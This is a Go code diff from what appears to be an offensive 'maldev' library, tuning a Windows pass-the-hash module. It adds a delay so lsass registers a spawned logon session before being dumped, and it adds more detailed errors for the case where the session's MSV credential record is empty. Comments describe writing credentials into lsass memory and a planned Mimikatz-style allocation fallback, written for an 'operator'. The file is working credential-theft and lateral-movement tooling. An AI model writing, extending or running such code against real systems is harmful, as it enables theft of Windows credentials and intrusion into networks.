@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"os"
 	"runtime"
+	"time"
 	"unsafe"
 
 	"github.com/oioio-space/maldev/credentials/lsassdump"
@@ -15,6 +16,15 @@ import (
 	wsyscall "github.com/oioio-space/maldev/win/syscall"
 	"golang.org/x/sys/windows"
 )
+
+// msvSettleDelay is the wait between the suspended-spawn returning
+// and the lsass dump. CreateProcessWithLogonW's logon-session
+// registration in MSV is asynchronous to the caller — lsasrv links
+// the new LIST_ENTRY shortly *after* the return, so an immediate
+// dump finds the spawned LUID's MSV record missing. 200 ms covers
+// every Win10/11 + Server 2019/2022 we tested; adjust upward if
+// you see ErrPTHNoMatchingLUID on a slower target.
+const msvSettleDelay = 200 * time.Millisecond
 
 // Windows-only Pass / PassImpersonate entry points + spawn helpers
 // + the LUID-resolve plumbing (TOKEN_STATISTICS). Cross-platform
@@ -65,6 +75,9 @@ func Pass(p PTHParams) (PTHResult, error) {
 		return PTHResult{}, err
 	}
 	res := PTHResult{PID: pid, LogonID: luid}
+
+	// Let lsass finish linking the MSV LIST_ENTRY before we dump.
+	time.Sleep(msvSettleDelay)
 
 	if err := writeBackMSV(&res, p); err != nil {
 		return res, err
@@ -130,8 +143,38 @@ func writeBackMSV(res *PTHResult, p PTHParams) error {
 
 	target := findMSVForLUID(parsed, res.LogonID)
 	if target == nil {
-		return errors.Join(ErrPTHNoMatchingLUID,
-			fmt.Errorf("LUID 0x%X not found among %d MSV sessions", res.LogonID, len(parsed.Sessions)))
+		// LUID may be present but with empty MSV PrimaryCredentials
+		// (CipherVA=0). This is the NETCREDENTIALS_ONLY case: the
+		// session exists in the MSV LIST_ENTRY but no encrypted
+		// credential blob is attached because no local auth ran.
+		// Mimikatz handles this by allocating fresh memory in lsass
+		// for a new PrimaryCredentials_data and patching the session
+		// node's CredentialsOffset — that's the chantier-II final
+		// slice (allocation fallback + Kerberos KERB_HASHPASSWORD
+		// write-back). The error surfaces enough context for the
+		// operator to know whether the LUID is missing entirely or
+		// just lacks an MSV cipher.
+		empty := false
+		for _, s := range parsed.Sessions {
+			if s.LUID != res.LogonID {
+				continue
+			}
+			for _, c := range s.Credentials {
+				if _, ok := c.(*MSVCredential); ok {
+					empty = true
+					break
+				}
+			}
+			break
+		}
+		if empty {
+			return errors.Join(ErrPTHNoMatchingLUID, fmt.Errorf(
+				"LUID 0x%X has empty MSV PrimaryCredentials (CipherVA=0) — likely NETCREDENTIALS_ONLY-spawned; allocation-fallback path is queued for the next chantier-II slice",
+				res.LogonID))
+		}
+		return errors.Join(ErrPTHNoMatchingLUID, fmt.Errorf(
+			"LUID 0x%X not found among %d MSV sessions",
+			res.LogonID, len(parsed.Sessions)))
 	}
 
 	// 4-6. Open lsass for write, NtRead live cipher, decrypt +
